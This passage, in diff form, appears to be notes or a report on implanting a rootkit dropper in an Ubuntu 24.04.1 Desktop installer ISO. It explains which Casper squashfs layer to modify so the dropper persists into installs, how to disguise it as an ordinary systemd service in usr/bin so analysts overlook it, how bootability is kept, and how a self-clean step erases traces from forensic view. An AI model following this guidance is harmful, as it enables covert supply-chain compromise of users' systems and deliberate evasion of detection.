+On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images, and `install-sources.yaml` maps each installable source to the base layer the installer writes to disk. The default source, `ubuntu-desktop-minimal`, maps to `minimal.squashfs`. The full desktop source, `ubuntu-desktop`, maps to `minimal.standard.squashfs`. Casper overlays the base plus the standard layers for the Live session, and the installer writes the base layer to the target disk. My first attempt placed the dropper in the Live leaf layer, `minimal.standard.live.squashfs`, which put it in the Live session but not on the installed system, because it is not the base of either source. Correcting that, I placed the dropper in `minimal.squashfs`, which is the base of the default source and is visible in the Live session through the overlay. The result works in both contexts under the default install path.
 
 Because the base layer is the full root filesystem, `usr/bin/` exists in it and I placed the dropper there. The base layer also contains `/usr/local/bin/`, which is a valid alternative. Either works; `usr/bin/` is the conventional location for system binaries on Ubuntu and is the least remarkable place for an analyst to scan past.
 
 I used a native systemd unit. It is one file plus one symlink in the standard systemd locations, structurally indistinguishable from any other service on the system. There is no shell wrapper, no compatibility path, and no extra artifact.
 
-I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the base Casper layer means the injection fires on both the Live session and the install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.
+I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the base Casper layer means the injection fires on both the Live session and the default install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.
 
 The self-clean raises the bar on the target side. On a successful install, the dropper, its unit, and the enable symlink are gone. Offline disk analysis of the installed system shows only whatever the rootkit chose to leave. In the Live session, the self-clean removes the artifacts from the ephemeral overlay, and the media remains unchanged; rebooting the same media re-deploys the dropper, which is the expected behavior for an ephemeral context.
 
